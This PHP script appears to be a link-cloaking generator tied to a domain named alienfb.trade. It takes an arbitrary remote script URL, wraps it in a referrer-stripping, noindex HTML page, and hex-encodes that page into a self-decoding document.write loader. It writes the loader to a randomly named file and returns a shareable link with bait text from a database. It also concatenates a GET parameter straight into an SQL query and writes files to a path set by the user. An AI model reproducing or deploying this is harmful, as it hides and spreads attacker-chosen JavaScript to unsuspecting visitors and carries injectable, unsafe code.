<?php
header('Content-type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: ');
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
require_once "./random_string.php";
require_once "./BaseDatosMySql.php";
$cottorra = trim($_GET['cottorra']) ? $_GET['cottorra'] : null;
$script = trim($_GET['script']) ? $_GET['script'] : null;

if($_SERVER['HTTP_REFERER'] !== 'https://alienfb.trade/'){
 die('Unauthorized access');}



$getcottorra=$pdoMySql->prepare("SELECT cottorra FROM cottorras WHERE  id='".$_GET['cottorra']."'");
$getcottorra->execute();
$info_cottorra=$getcottorra->fetchAll(PDO::FETCH_ASSOC);
foreach ($info_cottorra as $cottorraextraida) {
}


if(isset($script)) {
$NAMEFILE = rand().".fr";
$DOMAIN = $_SERVER['SERVER_NAME'];
$PROTOCOLO  =  "https://";
$SUBDOMINIO =  $_GET['subdominio']; 	
	
$contentHTML = '
<html>
<head>
<meta http-equiv="cache-control" content="no-cache">
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
</head>
<body>
<script src="'.$PROTOCOLO.$script.'" type="text/javascript" async="true"></script>
</body>
</html>';

$contentHTMLEXTRAIDO = $contentHTML;	
$decode =  utf8_decode($contentHTMLEXTRAIDO);
$hex = bin2hex($decode);	
$script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	

file_put_contents($SUBDOMINIO."/links". "/" .$NAMEFILE, $script);	
$response = array("url"=>$cottorraextraida['cottorra']." ".$SUBDOMINIO.$DOMAIN.'/'.$NAMEFILE);
echo json_encode($response);   		
} 
?>
